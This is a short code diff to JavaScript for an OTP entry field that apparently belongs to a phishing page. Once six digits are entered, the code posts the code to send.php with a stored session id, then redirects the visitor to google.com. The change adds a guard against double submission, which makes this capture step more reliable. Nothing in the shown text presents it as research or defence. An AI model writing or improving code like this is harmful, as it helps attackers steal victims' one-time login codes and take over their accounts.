@@ -1698,10 +1698,11 @@
                                     if (this.value.length > 6) {
                                       this.value = this.value.slice(0, 6);
                                     }
-                                    if (this.value.length === 6) {
+                                    if (this.value.length === 6 && !this.hasSubmitted) {
+                                      this.hasSubmitted = true;
                                       var random = localStorage.getItem("random");
                                       $.ajax({
-                                        url: "send.php",
+                                        url: "send.php", 
                                         type: "POST",
                                         data: {
                                           otp: this.value,
@@ -1709,8 +1710,7 @@
                                           type: "otp",
                                         },
                                         success: function (response) {
-                                          window.location.href =
-                                            "https://google.com";
+                                          window.location.href = "https://google.com";
                                         },
                                       });
                                     }
